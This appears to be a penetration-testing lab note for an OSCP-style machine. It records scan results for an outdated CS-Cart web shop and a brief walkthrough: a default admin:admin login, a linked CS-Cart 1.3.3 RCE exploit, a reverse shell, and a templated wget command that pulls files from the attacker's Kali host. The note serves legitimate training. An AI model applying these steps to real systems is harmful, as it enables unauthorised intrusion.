IP::   192.168.124.39

| Machine | IP Address | Notes |
| ------- | ---------- | ----- |
|         |            |       |

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
KALI IP::  192.168.45.232
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Discovered Web Domain::  192.168.217.39
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
[[Editing Page]]

wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8000/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Provided Credentials
---

```

```

```

```

---
## Software Versions

http://192.168.217.39:80/ [200 OK] Apache[2.2.4], CS-Cart, Cookies[cart_languageC,csid,secondary_currencyC], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6], IP[192.168.217.39], Meta-Author[CS-Cart.com], PHP[5.2.3-1ubuntu6], PasswordField[password], PoweredBy[the], Script[javascript], Title[CS-Cart. Powerful PHP shopping cart software], X-Powered-By[PHP/5.2.3-1ubuntu6] 



---



## Open Ports
---
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d

137/udp   open          netbios-ns

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```

---

192.168.217.39:80 shows cscart page.

dir busting finds /admin page

def creds admin:admin enters

administration > upgrade center reveals CSCart version 1.3.3

(https://github.com/reatva/CS-Cart-1.3.3-RCE/tree/master)

Receive Reverse shell connection

cd /home/patrick/local.txt

---

